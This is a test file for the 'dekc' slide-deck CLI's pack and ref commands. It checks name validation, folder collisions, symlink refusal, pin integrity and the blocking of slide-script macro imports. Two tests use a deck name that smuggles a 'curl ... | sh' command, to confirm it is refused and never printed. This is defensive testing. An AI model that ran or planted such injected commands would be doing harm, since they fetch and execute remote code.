import { describe, expect, test } from "bun:test";
import { existsSync } from "node:fs";
import {
  chmod,
  copyFile,
  mkdir,
  readdir,
  readFile,
  rename,
  rm,
  symlink,
  writeFile,
} from "node:fs/promises";
import { join } from "node:path";
import { contractIssues, printedBy } from "../../src/cli/contract.ts";
import { addRef, listRefs, removeRef, restoreRef } from "../../src/cli/ref.ts";
import { formatText } from "../../src/cli/result.ts";
import { resolveTarget } from "../../src/cli/scope.ts";
import { showCommand } from "../../src/cli/show.ts";
import { loadConfig } from "../../src/core/config.ts";
import { packDeck } from "../../src/core/pack.ts";
import { readRefMeta, refDir } from "../../src/core/ref.ts";
import { jsonStdout, type RunResult, runMain } from "../helpers/cli.ts";
import { withEnv } from "../helpers/env.ts";
import { withTempDir } from "../helpers/fs.ts";
import { type DeckSpec, withTempProject } from "../helpers/project.ts";

const REF = "file/talk";

const talk: DeckSpec = {
  name: "talk",
  script: "---\ntitle: A talk\n---\n\n## intro\n\nhello\n",
  slides: { intro: '<section class="slide"><h2 class="card">intro</h2></section>\n' },
  assets: { "chart.png": "png" },
};

const sender = { decks: [talk] };
const receiver = { toml: "# my talks\n", decks: [{ name: "mine" }] };
const fakePlaywright = join(import.meta.dir, "..", "helpers", "fake-playwright.ts");

/** The CLI in this process, its `--json` held to the contract as runDek holds it. */
async function run(args: string[], cwd: string): Promise<RunResult> {
  const result = await runMain(args, cwd);
  if (args.includes("--json")) {
    expect(contractIssues(printedBy(args), JSON.parse(result.stdout))).toEqual([]);
  }
  return result;
}

/** A pack of `deck` from a project of its own, at `dir/<file>`. */
async function packOf(dir: string, deck: DeckSpec, file = "talk.tgz"): Promise<string> {
  return withTempProject({ decks: [deck] }, async (root) => {
    const path = join(dir, file);
    await Bun.write(
      path,
      await packDeck({ root }, { name: deck.name, dir: join(root, "decks", deck.name) }),
    );
    return path;
  });
}

describe("dekc pack", () => {
  test.serial("writes dist/<deck>.tgz and returns it in outs", async () => {
    await withTempProject(sender, async (root) => {
      const result = await run(["pack", "talk", "--json"], root);
      expect(result).toMatchObject({ exitCode: 0 });
      const out = join(root, "decks", "talk", "dist", "talk.tgz");
      expect(jsonStdout<{ outs: string[] }>(result).outs).toEqual([out]);
      expect(existsSync(out)).toBe(true);
    });
  });

  test.serial(
    "warns the sender, who can fix it, when the pack would carry no license",
    async () => {
      await withTempProject(sender, async (root) => {
        const bare = await run(["pack", "talk", "--json"], root);
        expect(jsonStdout<{ warnings: string[] }>(bare).warnings).toEqual([
          expect.stringContaining('[pack] license = "CC0-1.0"'),
        ]);
        expect((await run(["pack", "talk"], root)).stdout).toContain("warning: ");
      });
      await withTempProject({ ...sender, toml: '[pack]\nlicense = "CC0-1.0"\n' }, async (root) => {
        expect(
          jsonStdout<{ warnings: string[] }>(await run(["pack", "talk", "--json"], root)).warnings,
        ).toEqual([]);
      });
    },
  );

  test.serial(
    "refuses a deck whose name a ref cannot carry, and says what it may hold",
    async () => {
      const name = "x`;curl$IFSexample.com|sh;`";
      await withTempProject({ decks: [{ ...talk, name }] }, async (root) => {
        const result = await run(["pack", name, "--json"], root);
        expect(result.exitCode).toBe(1);
        expect(jsonStdout<{ error: { hint: string } }>(result).error.hint).toContain(
          "letters, digits, dots, dashes, and underscores",
        );
        expect(existsSync(join(root, "decks", name, "dist"))).toBe(false);
      });
    },
  );

  test.serial("refuses a ref, which is not the reader's to hand on", async () => {
    await withTempDir(async (inbox) => {
      const pack = await packOf(inbox, talk);
      await withTempProject(receiver, async (root) => {
        await addRef(root, pack);
        const result = await run(["pack", REF], root);
        expect(result.exitCode).toBe(1);
        expect(result.stderr).toContain("read-only");
      });
    });
  });
});

describe("dekc ref <file>.tgz", () => {
  test.serial(
    "pins the pack as file/<deck>, commits it under packs/, and says to commit it",
    async () => {
      await withTempDir(async (inbox) => {
        const pack = await packOf(inbox, talk, "talk (1).tgz");
        await withTempProject(receiver, async (root) => {
          const result = await run(["ref", pack, "--json"], root);
          expect(result).toMatchObject({ exitCode: 0 });
          const json = jsonStdout<{ name: string; rev: string; changed: boolean; pack: string }>(
            result,
          );
          expect(json).toMatchObject({ name: REF, changed: true, pack: "packs/talk.tgz" });
          expect(json.rev).toMatch(/^[0-9a-f]{64}$/);

          expect(await readFile(join(root, "packs", "talk.tgz"))).toEqual(await readFile(pack));
          expect(loadConfig(join(root, "dek.toml")).refs).toEqual({ [REF]: json.rev });
          expect(readRefMeta(refDir(root, REF))?.rev).toBe(json.rev);
          expect(await readFile(join(root, ".gitignore"), "utf8")).toContain("refs/\n");
          expect(await readFile(join(root, ".gitignore"), "utf8")).not.toContain("packs");
          expect(await readFile(join(root, "AGENTS.md"), "utf8")).toContain(`- \`${REF}\`: A talk`);

          const text = await run(["ref", pack], root);
          expect(text.stdout).toContain("commit packs/talk.tgz");
          expect(text.stdout).toContain(`dekc show ${REF} <slug>`);
        });
      });
    },
  );

  test.serial("adds [refs] after the [pack] table a new project has", async () => {
    await withTempDir(async (inbox) => {
      const pack = await packOf(inbox, talk);
      const toml = '# dek project\n\n[pack]\nlicense = "CC0-1.0"\n';
      await withTempProject({ ...receiver, toml }, async (root) => {
        const { rev } = await addRef(root, pack);
        expect(loadConfig(join(root, "dek.toml"))).toMatchObject({
          pack: { license: "CC0-1.0" },
          refs: { [REF]: rev },
        });
      });
    });
  });

  test.serial("dekc show reads it as a ref, with the digest it is pinned to", async () => {
    await withTempDir(async (inbox) => {
      const pack = await packOf(inbox, talk);
      await withTempProject(receiver, async (root) => {
        const { rev } = await addRef(root, pack);
        const result = await run(["show", REF, "intro", "--json"], root);
        expect(result).toMatchObject({ exitCode: 0 });
        const json = jsonStdout<{ html: string; ref: { name: string; rev: string } }>(result);
        expect(json.html).toContain('class="card"');
        expect(json.ref).toMatchObject({ name: REF, rev });
      });
    });
  });

  test.serial(
    "the same deck again changes nothing; a newer one moves the pin and says from where",
    async () => {
      await withTempDir(async (inbox) => {
        const first = await packOf(inbox, talk, "first.tgz");
        const again = await packOf(inbox, talk, "again.tgz");
        const newer = await packOf(
          inbox,
          { ...talk, slides: { intro: '<section class="slide"><h2>new</h2></section>\n' } },
          "newer.tgz",
        );
        await withTempProject(receiver, async (root) => {
          const added = await addRef(root, first);
          expect(await addRef(root, again)).toMatchObject({ rev: added.rev, changed: false });
          const moved = await addRef(root, newer);
          expect(moved).toMatchObject({ from: added.rev, changed: true });
          expect(await readFile(join(root, "packs", "talk.tgz"))).toEqual(await readFile(newer));
        });
      });
    },
  );

  test.serial("pins the committed pack in place, as after a clone", async () => {
    await withTempDir(async (inbox) => {
      const pack = await packOf(inbox, talk);
      await withTempProject(receiver, async (root) => {
        const { rev } = await addRef(root, pack);
        await removeRef(root, REF);
        await Bun.write(join(root, "packs", "talk.tgz"), await readFile(pack));
        expect(await addRef(root, "packs/talk.tgz")).toMatchObject({ rev, changed: true });
        expect(await readFile(join(root, "packs", "talk.tgz"))).toEqual(await readFile(pack));
      });
    });
  });

  test.serial(
    "refuses a tarball of more than one deck, and a file that is not a pack",
    async () => {
      await withTempDir(async (inbox) => {
        const two = join(inbox, "two.tgz");
        await Bun.write(
          two,
          await new Bun.Archive(
            {
              "p/dek.toml": "",
              "p/decks/a/script.md": "---\ntitle: A\n---\n",
              "p/decks/b/script.md": "---\ntitle: B\n---\n",
            },
            { compress: "gzip" },
          ).bytes(),
        );
        const zip = join(inbox, "talk.tar.gz");
        await writeFile(zip, "PK\u0003\u0004");
        await withTempProject(receiver, async (root) => {
          await expect(addRef(root, two)).rejects.toMatchObject({
            message: "the pack holds more than one deck: a, b",
            path: two,
            hint: expect.stringContaining("dekc pack <deck>"),
          });
          await expect(addRef(root, zip)).rejects.toMatchObject({
            message: expect.stringContaining("not a pack"),
            path: zip,
          });
          await expect(addRef(root, join(inbox, "missing.tgz"))).rejects.toMatchObject({
            message: expect.stringContaining("no such file"),
          });
          expect(existsSync(join(root, "packs"))).toBe(false);
          expect(loadConfig(join(root, "dek.toml")).refs).toBeUndefined();
        });
      });
    },
  );

  test.serial(
    "refuses a pack whose name differs from a pinned one's only in case, which shares its folders",
    async () => {
      await withTempDir(async (inbox) => {
        const upper = await packOf(inbox, { ...talk, name: "Talk" }, "Talk.tgz");
        const other = { ...talk, script: "---\ntitle: Another\n---\n\n## intro\n\nhi\n" };
        const lower = await packOf(inbox, other, "lower.tgz");
        await withTempProject(receiver, async (root) => {
          await addRef(root, upper);
          const toml = await readFile(join(root, "dek.toml"), "utf8");
          await expect(addRef(root, lower)).rejects.toMatchObject({
            message: "file/talk would share its folders with file/Talk, which dek.toml pins",
            hint: expect.stringContaining("`dekc ref rm file/Talk`"),
          });
          expect(await readFile(join(root, "dek.toml"), "utf8")).toBe(toml);
          expect(await Bun.file(join(root, "packs", "Talk.tgz")).bytes()).toEqual(
            await Bun.file(upper).bytes(),
          );
        });
      });
    },
  );

  test.serial(
    "refuses a pack whose name folds to a pinned one's as APFS folds it, or to a folder on disk",
    async () => {
      const other = { ...talk, script: "---\ntitle: Another\n---\n\n## intro\n\nhi\n" };
      await withTempDir(async (inbox) => {
        for (const [first, second] of [
          ["aς", "aσ"],
          ["ﬁle", "file"],
        ] as const) {
          // Files of their own: the inbox is on a file system that may fold the names too.
          const kept = await packOf(inbox, { ...talk, name: first }, "kept.tgz");
          const next = await packOf(inbox, { ...other, name: second }, "next.tgz");
          await withTempProject(receiver, async (root) => {
            await addRef(root, kept);
            await expect(addRef(root, next)).rejects.toMatchObject({
              message: `file/${second} would share its folders with file/${first}, which dek.toml pins`,
            });
            expect(Object.keys(loadConfig(join(root, "dek.toml")).refs ?? {})).toEqual([
              `file/${first}`,
            ]);
          });
        }
        const pack = await packOf(inbox, talk, "talk.tgz");
        for (const left of [join("refs", "file", "Talk"), join("packs", "Talk.tgz")]) {
          await withTempProject(receiver, async (root) => {
            await mkdir(join(root, left), { recursive: true });
            await expect(addRef(root, pack)).rejects.toMatchObject({
              message: `file/talk would share a folder with ${left}, which is already in the project`,
            });
            expect(loadConfig(join(root, "dek.toml")).refs).toBeUndefined();
          });
        }
      });
    },
  );

  test.serial(
    "refuses a pack whose deck a ref cannot name, without printing the name",
    async () => {
      const name = "x`;curl$IFSexample.com|sh;`";
      await withTempDir(async (inbox) => {
        const pack = join(inbox, "talk.tgz");
        await Bun.write(
          pack,
          await new Bun.Archive(
            { "p/dek.toml": "", [`p/decks/${name}/script.md`]: "---\ntitle: A\n---\n" },
            { compress: "gzip" },
          ).bytes(),
        );
        await withTempProject(receiver, async (root) => {
          const result = await run(["ref", pack, "--json"], root);
          expect(result.exitCode).toBe(1);
          const { error } = jsonStdout<{ error: { message: string; hint: string } }>(result);
          expect(error).toMatchObject({
            message: "the pack's deck has a name a ref cannot carry",
            hint: expect.stringContaining("letters, digits, dots, dashes, and underscores"),
          });
          expect(result.stdout).not.toContain("curl");
          expect((await run(["ref", pack], root)).stderr).not.toContain("curl");
          expect(existsSync(join(root, "packs"))).toBe(false);
          expect(existsSync(join(root, "refs"))).toBe(false);
          expect(loadConfig(join(root, "dek.toml")).refs).toBeUndefined();
        });
      });
    },
  );
});

describe("a pack's ref after a clone", () => {
  test.serial("a read unpacks the snapshot again from the committed pack", async () => {
    await withTempDir(async (inbox) => {
      const pack = await packOf(inbox, talk);
      await withTempProject(receiver, async (root) => {
        const { rev } = await addRef(root, pack);
        await rm(join(root, "refs"), { recursive: true });
        expect(listRefs(root).refs).toEqual([{ name: REF, rev, fetched: false }]);
        expect(formatText({ command: "ref", data: listRefs(root) })).toContain("packs/talk.tgz");
        const result = await run(["show", REF, "intro", "--json"], root);
        expect(result).toMatchObject({ exitCode: 0 });
        expect(readRefMeta(refDir(root, REF))?.rev).toBe(rev);
      });
    });
  });

  test.serial(
    "a pack that is missing, or no longer the pinned one, stops the read and says what to run",
    async () => {
      await withTempDir(async (inbox) => {
        const pack = await packOf(inbox, talk);
        const other = await packOf(
          inbox,
          { ...talk, script: "---\ntitle: Other\n---\n\n## intro\n" },
          "other.tgz",
        );
        await withTempProject(receiver, async (root) => {
          await addRef(root, pack);
          await rm(join(root, "refs"), { recursive: true });
          await copyFile(other, join(root, "packs", "talk.tgz"));
          await expect(restoreRef(root, REF)).rejects.toMatchObject({
            message: "packs/talk.tgz is not the pack file/talk is pinned to",
            hint: expect.stringContaining("dekc ref packs/talk.tgz"),
          });
          await rm(join(root, "packs"), { recursive: true });
          const result = await run(["show", REF, "intro"], root);
          expect(result.exitCode).toBe(1);
          expect(result.stderr).toContain("packs/talk.tgz is missing");
          expect(result.stderr).toContain("commit packs/");
        });
      });
    },
  );

  test.serial("a read never writes a snapshot from a pack that does not match", async () => {
    await withTempDir(async (inbox) => {
      const pack = await packOf(inbox, talk);
      const other = await packOf(
        inbox,
        { ...talk, script: "---\ntitle: Other\n---\n\n## intro\n" },
        "other.tgz",
      );
      await withTempProject(receiver, async (root) => {
        await addRef(root, pack);
        await rm(join(root, "refs"), { recursive: true });
        await copyFile(other, join(root, "packs", "talk.tgz"));
        await restoreRef(root, REF).catch(() => {});
        expect(existsSync(refDir(root, REF))).toBe(false);
        expect(() =>
          showCommand(resolveTarget(root, "deck", { refs: true, deck: REF }), "intro"),
        ).toThrow(
          expect.objectContaining({ hint: expect.stringContaining("dekc ref packs/talk.tgz") }),
        );
      });
    });
  });
});

describe("a pack's slide script", () => {
  // Bun would run the macro in the reader's dek while it read the script, before any refusal.
  test.serial("is refused by dekc shot without its macro import running", async () => {
    await withTempDir(async (inbox) => {
      const mark = join(inbox, "macro-ran");
      const script = `import { writeFileSync } from "node:fs" with { type: "macro" };\nwriteFileSync(${JSON.stringify(mark)}, "ran");\nexport default {};\n`;
      const pack = await packOf(inbox, { ...talk, scripts: { intro: script } });
      await withTempProject(receiver, async (root) => {
        expect(await run(["ref", pack], root)).toMatchObject({ exitCode: 0 });
        expect(existsSync(mark)).toBe(false);
        await chmod(fakePlaywright, 0o755);
        const result = await withEnv({ DEK_PLAYWRIGHT: fakePlaywright }, () =>
          run(["shot", REF, "intro", "--json"], root),
        );
        expect(existsSync(mark)).toBe(false);
        expect(result).toMatchObject({ exitCode: 1 });
        expect(jsonStdout<{ error: { message: string } }>(result).error.message).toBe(
          'invalid slide script "intro": imports are not supported; keep the slide script self-contained',
        );
      });
    });
  });
});

describe("a link at packs/", () => {
  test.serial("adding a pack writes nothing through it, in the project or out", async () => {
    await withTempDir(async (inbox) => {
      const pack = await packOf(inbox, talk);
      await withTempProject(receiver, async (root) => {
        await mkdir(join(root, "decks", "mine", "assets"), { recursive: true });
        await symlink(join(root, "decks", "mine", "assets"), join(root, "packs"));
        const toml = await readFile(join(root, "dek.toml"), "utf8");
        await expect(addRef(root, pack)).rejects.toMatchObject({
          message: "packs is a symlink; dek follows no link under packs/",
          hint: expect.stringContaining("remove packs"),
        });
        expect(await readdir(join(root, "decks", "mine", "assets"))).toEqual([]);
        expect(existsSync(join(root, "refs"))).toBe(false);
        expect(await readFile(join(root, "dek.toml"), "utf8")).toBe(toml);
      });
    });
  });

  test.serial("rm removes nothing through it, nor through a pack that is a link", async () => {
    await withTempDir(async (inbox) => {
      const pack = await packOf(inbox, talk);
      await withTempProject(receiver, async (root) => {
        await addRef(root, pack);
        const assets = join(root, "decks", "mine", "assets");
        await mkdir(assets, { recursive: true });
        await rename(join(root, "packs", "talk.tgz"), join(assets, "talk.tgz"));
        await rm(join(root, "packs"), { recursive: true });
        await symlink(assets, join(root, "packs"));
        const toml = await readFile(join(root, "dek.toml"), "utf8");
        expect(() => removeRef(root, REF)).toThrow(
          expect.objectContaining({
            message: "packs is a symlink; dek follows no link under packs/",
          }),
        );
        await rm(join(root, "packs"));
        await mkdir(join(root, "packs"));
        await symlink(join(assets, "talk.tgz"), join(root, "packs", "talk.tgz"));
        expect(() => removeRef(root, REF)).toThrow(
          expect.objectContaining({
            message: "packs/talk.tgz is a symlink; dek follows no link under packs/",
          }),
        );
        expect(await readdir(assets)).toEqual(["talk.tgz"]);
        expect(await readFile(join(root, "dek.toml"), "utf8")).toBe(toml);
      });
    });
  });
});

describe("dekc ref rm file/<deck>", () => {
  test.serial("drops the pin, the snapshot, the pack, and packs/ once it is empty", async () => {
    await withTempDir(async (inbox) => {
      const pack = await packOf(inbox, talk);
      await withTempProject(receiver, async (root) => {
        await addRef(root, pack);
        expect(removeRef(root, REF)).toEqual({ action: "rm", name: REF });
        expect(await readFile(join(root, "dek.toml"), "utf8")).toBe("# my talks\n");
        expect(existsSync(join(root, "refs"))).toBe(false);
        expect(existsSync(join(root, "packs"))).toBe(false);
      });
    });
  });
});
